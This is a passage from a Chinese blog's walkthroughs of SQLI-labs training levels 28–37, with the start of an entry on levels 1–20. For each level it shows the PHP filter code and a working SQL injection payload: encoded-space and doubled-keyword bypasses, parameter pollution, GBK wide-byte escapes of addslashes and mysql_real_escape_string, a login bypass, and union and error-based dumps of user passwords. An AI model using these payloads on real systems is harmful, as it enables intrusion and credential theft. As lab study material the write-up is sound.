相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p><pre><code class="hljs sql">?id=999&quot;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span></code></pre><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则如下：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 - # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 空格 +</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);.<span class="hljs-comment"># 过滤 union select /i 大小写都过滤</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>%a0SEPARATOR%a00x3c62723e))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>比 Less-28 还少了几个过滤规则，可以直接使用 Less-28 的payload：</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p><ul><li><code>index.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># id = &#x27;x&#x27; 的拼接方式</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 查询 query 的字符串</span><span class="hljs-variable">$qs</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-comment"># 模拟 tomcat 的查询函数 处理一下</span><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 再次过滤检测</span>whitelist(<span class="hljs-variable">$id1</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());<span class="hljs-meta">?&gt;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">java_implimentation</span>(<span class="hljs-params"><span class="hljs-variable">$query_string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$q_s</span> = <span class="hljs-variable">$query_string</span>;    <span class="hljs-comment"># &amp; 作为分隔符 分割字符串</span>    <span class="hljs-variable">$qs_array</span>= explode(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-variable">$q_s</span>);    <span class="hljs-comment"># 遍历 qs_array 数组</span>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$qs_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)    &#123;            <span class="hljs-variable">$val</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>);        <span class="hljs-comment"># 如果数组前两位是 id 的话</span>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$val</span>==<span class="hljs-string">&quot;id&quot;</span>)        &#123;                <span class="hljs-comment"># 截取 $value 的3-30 的字符串 作为 id 的值 </span>            <span class="hljs-variable">$id_value</span>=substr(<span class="hljs-variable">$value</span>,<span class="hljs-number">3</span>,<span class="hljs-number">30</span>);             <span class="hljs-keyword">return</span> <span class="hljs-variable">$id_value</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">whitelist</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-comment"># 过滤规则 检测数字</span>    <span class="hljs-variable">$match</span> = preg_match(<span class="hljs-string">&quot;/^\d+$/&quot;</span>, <span class="hljs-variable">$input</span>);    <span class="hljs-keyword">if</span> 不符合规则：        header(<span class="hljs-string">&#x27;Location: hacked.php&#x27;</span>);&#125;</code></pre><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p><pre><code class="hljs Php"><span class="hljs-variable">$id1</span>=java_implimentation(<span class="hljs-variable">$qs</span>);...whitelist(<span class="hljs-variable">$id1</span>);</code></pre><p><code>whitelist</code> 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 <code>hacked.php</code>，这里是没毛病的。那么问题出在了这里函数<code>$id1=java_implimentation($qs);</code></p><p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p><p>假设用户输入这样的语句：</p><pre><code class="hljs Php">index.php?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">2</span></code></pre><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><p>知道这个原理的话后面尝试直接注入吧：</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><pre><code class="hljs sql">login.php?id=2&amp;id=-2&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-32-宽字节注入"><a href="#Less-32-宽字节注入" class="headerlink" title="Less-32(宽字节注入)"></a>Less-32(宽字节注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>考察 Bypass addslashes()，关键的防护代码如下：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;        <span class="hljs-comment"># \ 转换为 \\</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/&#x27;</span>. preg_quote(<span class="hljs-string">&#x27;\\&#x27;</span>) .<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          将       <span class="hljs-comment"># 将 &#x27; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);         <span class="hljs-comment"># 将 &quot; 转为\&quot;</span>    <span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&#x27;/\&quot;/&#x27;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><strong>宽字节注入原理</strong></p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p><p>1、<code>%df</code> 吃掉 <code>\</code></p><p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>2、将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</p><p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p><pre><code class="hljs Php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= addslashes(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th>预定义字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><blockquote><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p></blockquote><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>过滤方法依然和 Less-33 一致：</p><pre><code class="hljs php"><span class="hljs-variable">$uname</span> = addslashes(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= addslashes(<span class="hljs-variable">$passwd1</span>);</code></pre><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>MySQL 注入天书这里介绍了一个新的方法</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p><p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><pre><code class="hljs Bash">➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-16</span><span class="hljs-string">��&#x27;</span>➜  ~ <span class="hljs-built_in">echo</span> \<span class="hljs-string">&#x27;|iconv -f utf-8 -t utf-32</span><span class="hljs-string">��&#x27;</span></code></pre><p>首先尝试一个经典的万能密码：</p><pre><code class="hljs Payload">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</code></pre><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p><pre><code class="hljs Sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;�&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-comment">#and password=&#x27;$passwd&#x27; LIMIT 0,1</span></code></pre><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p><pre><code class="hljs Bash"><span class="hljs-comment"># where username = &#x27;x&#x27; or 1</span>mysql&gt;  select * from users <span class="hljs-built_in">where</span> username = <span class="hljs-string">&#x27;x&#x27;</span> or 1;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0</span><span class="hljs-string">mysql&gt;  select * from users where username = &#x27;</span>x<span class="hljs-string">&#x27; or 0;</span><span class="hljs-string">Empty set (0.00 sec)</span><span class="hljs-string"></span><span class="hljs-string"># where 1</span><span class="hljs-string">mysql&gt;  select * from users where 1;</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">| id | username   | password |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">|  1 | Dumb       | 0        |</span><span class="hljs-string">|  2 | Angelina   | 0        |</span><span class="hljs-string">|  3 | Dummy      | 0        |</span><span class="hljs-string">|  4 | secure     | 0        |</span><span class="hljs-string">|  5 | stupid     | 0        |</span><span class="hljs-string">|  6 | superman   | 0        |</span><span class="hljs-string">|  7 | batman     | 0        |</span><span class="hljs-string">|  8 | admin      | 1234     |</span><span class="hljs-string">|  9 | admin1     | 0        |</span><span class="hljs-string">| 10 | admin2     | 0        |</span><span class="hljs-string">| 11 | admin3     | 0        |</span><span class="hljs-string">| 12 | dhakkan    | 0        |</span><span class="hljs-string">| 14 | admin4     | 0        |</span><span class="hljs-string">| 15 | admin&#x27;</span><span class="hljs-comment">#sec | 123      |</span>+----+------------+----------+14 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<span class="hljs-comment"># where 0</span>mysql&gt; select * from users <span class="hljs-built_in">where</span> 0;Empty <span class="hljs-built_in">set</span> (0.00 sec)</code></pre><p>那么直接尝试一下最基本的联合查询注入看看：</p><pre><code class="hljs sql">uname=�&#x27; and 1=2 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre><p>也是 OK 的</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span> = addslashes(<span class="hljs-variable">$string</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>但是本关的拼接方式是：</p><pre><code class="hljs Bash"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-variable">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><h2 id="Less-36-Bypass-mysql-real-escape-string"><a href="#Less-36-Bypass-mysql-real-escape-string" class="headerlink" title="Less-36(Bypass mysql_real_escape_string)"></a>Less-36(Bypass mysql_real_escape_string)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>主要防护代码：</p><pre><code class="hljs Php"><span class="hljs-variable">$id</span>=check_quotes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$string</span>= mysql_real_escape_string(<span class="hljs-variable">$string</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;&#125;</code></pre><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p><pre><code class="hljs sql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><p>或者</p><pre><code class="hljs sql">?id=-1�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+ </span></code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>依然使用了 和 Less-36 的防护方法：</p><pre><code class="hljs Php"><span class="hljs-variable">$uname</span> = mysql_real_escape_string(<span class="hljs-variable">$uname1</span>);<span class="hljs-variable">$passwd</span>= mysql_real_escape_string(<span class="hljs-variable">$passwd1</span>);</code></pre><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p><pre><code class="hljs sql">uname=admin%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=admin</span></code></pre><p>或者：</p><pre><code class="hljs sql">uname=�&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(username,<span class="hljs-keyword">password</span> SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>)<span class="hljs-comment">#&amp;passwd=</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI labs 靶场笔记之基础挑战 1-20 关</title>
    <link href="/p/22efef48.html"/>
    <url>/p/22efef48.html</url>
    
    <content type="html"><![CDATA[<h1 id="常见注入流程"><a href="#常见注入流程" class="headerlink" title="常见注入流程"></a>常见注入流程</h1><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><pre><code class="hljs sql">?id=1&#x27;?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>手动修改 <code>LIMIT 0,1</code> 来进行结果偏移</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 